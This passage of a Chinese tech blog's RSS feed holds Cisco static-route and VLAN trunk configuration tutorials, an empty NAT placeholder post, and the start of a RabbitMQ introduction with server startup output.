<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       D</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> EIGRP,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> EX</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> EIGRP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> external,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> O</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OSPF,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IA</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OSPF</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> area</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       N1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OSPF</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> NSSA</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> external</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> N2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OSPF</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> NSSA</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> external</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       E1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OSPF</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> external</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> E2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> OSPF</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> external</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> E</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> EGP</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IS-IS,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> L1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IS-IS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> level-1,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> L2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IS-IS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> level-2,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ia</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IS-IS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> area</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       *</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> candidate</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> U</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> per-user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> static</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> route,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ODR</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       P</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> periodic</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> downloaded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> static</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> route</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Gateway</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> last</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> resort</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     10.0.0.0/24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> subnetted,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> subnets</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       10.1.1.0/24</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [1/0] via 209.165.200.224</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       10.1.2.0/24</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [1/0] via 209.165.200.224</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     192.168.10.0/24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> variably</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> subnetted,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> subnets,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> masks</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       192.168.10.0/24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> directly</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> connected,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GigabitEthernet0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       192.168.10.1/32</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> directly</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> connected,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GigabitEthernet0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     192.168.11.0/24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> variably</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> subnetted,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> subnets,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> masks</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       192.168.11.0/24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> directly</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> connected,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GigabitEthernet0/1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       192.168.11.1/32</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> directly</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> connected,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GigabitEthernet0/1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     209.165.200.0/24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> variably</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> subnetted,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> subnets,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> masks</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       209.165.200.224/30</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> directly</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> connected,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Serial0/0/0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       209.165.200.225/32</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> directly</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> connected,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Serial0/0/0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>R1退出配置模式并保存配置</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# exit</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> write</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> memory</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Building</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> configuration...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[OK]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>R2路由器配置</h2>
<h3>R2进入特权模式</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">enable</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>R2进入全局配置模式</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R2#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> configure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> terminal</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>R2配置静态路由</h3>
<p>添加静态路由，将目的网络和子网掩码与下一跳地址关联。以下命令配置了到达 <code>192.168.10.0/30</code> 和 <code>192.168.11.0/30</code> 网络的静态路由，下一跳地址为 <code>209.165.200.225</code>：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R2(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# ip route 192.168.10.0 255.255.255.252 209.165.200.225</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R2(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# ip route 192.168.11.0 255.255.255.252 209.165.200.225</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>R2退出配置模式并保存配置</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R2(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# exit</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R2#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> write</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> memory</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Building</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> configuration...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[OK]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>总结</h2>
<p>在R1和R2上配置静态路由可以确保两个路由器之间的网络流量能够正确地转发。通过这些配置命令，你可以有效地管理和维护网络的路由路径。</p>
]]></content:encoded>
    </item>
    <item>
      <title>Cisco交换机Vlan中继配置</title>
      <link>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E4%BA%A4%E6%8D%A2%E6%9C%BAVlan%E4%B8%AD%E7%BB%A7%E9%85%8D%E7%BD%AE.html</link>
      <guid>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E4%BA%A4%E6%8D%A2%E6%9C%BAVlan%E4%B8%AD%E7%BB%A7%E9%85%8D%E7%BD%AE.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Cisco交换机Vlan中继配置</source>
      <description>Cisco交换机Vlan中继配置 在以太网交换机的网络中，中继（Trunking）是一个关键概念，用于在交换机之间传输多个VLAN的数据流。配置中继可以确保不同VLAN之间的流量能够跨越多个交换机进行传输。中继端口通常用于连接交换机、路由器或其他网络设备，以支持跨VLAN的通信。 在本文档中，我们将介绍如何在Cisco交换机上配置中继端口，包括二层交换...</description>
      <pubDate>Thu, 25 Jul 2024 10:48:40 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>在以太网交换机的网络中，中继（Trunking）是一个关键概念，用于在交换机之间传输多个VLAN的数据流。配置中继可以确保不同VLAN之间的流量能够跨越多个交换机进行传输。中继端口通常用于连接交换机、路由器或其他网络设备，以支持跨VLAN的通信。</p>
<p>在本文档中，我们将介绍如何在Cisco交换机上配置中继端口，包括二层交换机和三层交换机的不同配置步骤。</p>
</blockquote>
<h2>配置步骤</h2>
<h3>1. 进入接口配置模式</h3>
<p>首先，你需要进入你要配置的接口模式。假设我们配置的是接口 <code>fa0/1</code>，输入以下命令：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S1(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# interface fa0/1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>2. 配置为中继模式</h3>
<p>将接口模式设置为中继模式，这样可以允许多个VLAN通过此接口传输：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S1(config-if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# switchport mode trunk</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>3. 允许所有VLAN通过中继</h3>
<p>配置中继接口允许所有VLAN通过：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S1(config-if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# switchport trunk allow vlan all</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>4. 设置本地VLAN（Native VLAN）</h3>
<p>指定一个本地VLAN（Native VLAN），这是未标记的流量将会使用的VLAN。我们将本地VLAN设置为99：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S1(config-if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# switchport trunk native vlan 99</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>5. （仅适用于三层交换机）配置封装类型</h3>
<p>如果你正在配置三层交换机，还需要指定封装类型。在这种情况下，我们使用IEEE 802.1Q封装：</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>S1(config-if)# switchport trunk encapsulation dot1q</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>配置示例</h2>
<p>完整的配置示例如下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S1(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# interface fa0/1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S1(config-if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# switchport mode trunk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S1(config-if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# switchport trunk allow vlan all</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S1(config-if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# switchport trunk native vlan 99</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">S1(config-if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# switchport trunk encapsulation dot1q</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Cisco路由器配置动态NAT</title>
      <link>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E8%B7%AF%E7%94%B1%E5%99%A8%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81NAT.html</link>
      <guid>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E8%B7%AF%E7%94%B1%E5%99%A8%E9%85%8D%E7%BD%AE%E5%8A%A8%E6%80%81NAT.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Cisco路由器配置动态NAT</source>
      <description>Cisco路由器配置动态NAT TODO Lost Forever!!!</description>
      <pubDate>Thu, 25 Jul 2024 10:48:40 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>TODO</h2>
<p>Lost Forever!!!</p>
]]></content:encoded>
    </item>
    <item>
      <title>RabbitMQ基础概念篇</title>
      <link>https://www.geekery.cn/note-book/RabbitMQ/RabbitMQ%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E7%AF%87.html</link>
      <guid>https://www.geekery.cn/note-book/RabbitMQ/RabbitMQ%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E7%AF%87.html</guid>
      <source url="https://www.geekery.cn/rss.xml">RabbitMQ基础概念篇</source>
      <description>RabbitMQ基础概念篇 消息队列简介 消息队列是一种用于应用程序间通信的方法，其中“消息”指的是应用程序之间传输的数据包。“消息队列”则是这种数据传输机制的核心组件，它提供了异步处理、解耦和负载均衡的能力。 消息 指的是应用之间传输的数据 消息队列 应用之间通信的一种方式 为什么要用消息队列 异步协作机制 消息队列允许发送者和接收者之间实现松散耦合...</description>
      <pubDate>Tue, 23 Jul 2024 06:27:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>消息队列简介</h2>
<p>消息队列是一种用于应用程序间通信的方法，其中“消息”指的是应用程序之间传输的数据包。“消息队列”则是这种数据传输机制的核心组件，它提供了异步处理、解耦和负载均衡的能力。</p>
<ul>
<li>消息  指的是应用之间传输的数据</li>
<li>消息队列  应用之间通信的一种方式</li>
</ul>
<h2>为什么要用消息队列 异步协作机制</h2>
<p>消息队列允许发送者和接收者之间实现松散耦合，即发送者无需等待接收者的响应即可继续执行后续逻辑，而接收者可以独立于发送者的时间线处理消息。这种机制类似于快递员与菜鸟驿站的关系，快递员只需将包裹送至驿站，而无需知道包裹何时会被收件人领取。</p>
<blockquote>
<p>消息的发布者不知道谁接受的，消息的接收者不需要知道谁发出的，两者都不需要知道互相之间的存在</p>
</blockquote>
<p>异步协作机制</p>
<p>
就像是，快递员与菜鸟驿站</p>
<h2>RabbitMQ特性</h2>
<p>RabbitMQ是一个由Erlang语言编写的开源消息代理软件，它实现了高级消息队列协议（AMQP）。AMQP是一种开放标准的应用层协议，为消息代理的设计提供了统一的框架，不受特定编程语言或平台的限制。</p>
<p>AMQP：Advanced Message Queue ，高级消息队列协议。应用层。方便中间件设计。（一种标准，不受语言限制，符合标准就可以）</p>
<ul>
<li><strong>集群能力</strong>：支持多节点集群，提高可用性和扩展性。</li>
<li><strong>高可用性</strong>：通过镜像队列和其他机制确保即使在部分节点故障时，消息依然可以被处理。</li>
<li><strong>灵活的路由</strong>：提供丰富的路由策略，使得消息可以根据预定义的规则被定向到不同的队列。</li>
<li><strong>管理界面</strong>：提供图形化的管理界面，便于监控和管理。</li>
<li><strong>跟踪机制</strong>：可以追踪消息的流转过程，便于调试和问题排查。</li>
<li><strong>可靠性</strong>：保证消息的持久存储和可靠投递。</li>
</ul>
<h2>RabbitMQ安装启动关闭</h2>
<h3>安装步骤</h3>
<ol>
<li><strong>安装Erlang</strong>：RabbitMQ依赖于Erlang运行环境。</li>
<li><strong>安装RabbitMQ</strong>：通过包管理器或官方源进行安装。</li>
</ol>
<h3>RabbitMQ的启动和关闭</h3>
<h4>启动RabbitMQ</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit1 ~]# rabbitmq-server start &amp;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[1] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1732</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit1 ~]# </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">              RabbitMQ</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3.3.5.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Copyright</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (C) 2007-2014 GoPivotal, Inc.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  ##  ##      Licensed under the MPL.  See http://www.rabbitmq.com/</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  ##  ##</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  ##########  Logs: /var/log/rabbitmq/rabbit@rabbit1.log</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  ######  ##        /var/log/rabbitmq/rabbit@rabbit1-sasl.log</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  ##########</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">              Starting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> broker...</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> completed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> with</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> plugins.</span></span>
<span class="line"></span>
